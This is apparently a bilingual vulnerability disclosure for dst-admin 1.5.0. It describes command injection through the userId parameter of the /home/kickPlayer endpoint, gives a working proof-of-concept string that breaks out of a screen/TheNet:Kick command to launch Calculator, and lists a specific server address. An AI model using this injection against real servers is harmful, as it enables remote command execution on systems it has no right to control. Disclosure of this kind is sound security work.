## Dst-admin 1.5.0 background kickPlayer interface remote command execution

An issue was discovered in dst-admin v1.5.0. The product has an background kickPlayer interface remote command execution that can expose sensitive information.

Vulnerability address：http://101.42.5.89:8080/



### Vulnerability exploitation

通过get请求`/home/kickPlayer`接口，传入userId，value为“open -a Calculator”之类的命令的字符串，可远程执行命令。

执行时需要将userId的值URL编码处理，不然会返回400报错。

POC如下：

```java
\")\n"&open -a Calculator&screen -S "DST_CAVES" -p 0 -X stuff "TheNet:Kick(\"
```

Through the get request '/home/kickPlayer' interface, a string of commands such as userId and value "open - a Calculator" is passed in to execute commands remotely.
The value URL of userId needs to be encoded during execution, otherwise an error of 400 will be returned.
The POC is as follows:

```java
\")\n"&open -a Calculator&screen -S "DST_CAVES" -p 0 -X stuff "TheNet:Kick(\"
```

<img src="./pic/1.png" alt="1" style="zoom:200%;" />

通过后台打印日志可以看出通过TheNet:Kick执行userId，所以需要闭合TheNet:Kick命令，才能执行命令。

The spooling log shows that the userId is executed through TheNet: Kick, so the TheNet: Kick command needs to be closed before the command can be executed.

<img src="./pic/2.png" alt="1" style="zoom:200%;" />

命令执行成功。

The command was executed successfully.

<img src="./pic/3.png" alt="1" style="zoom:200%;" />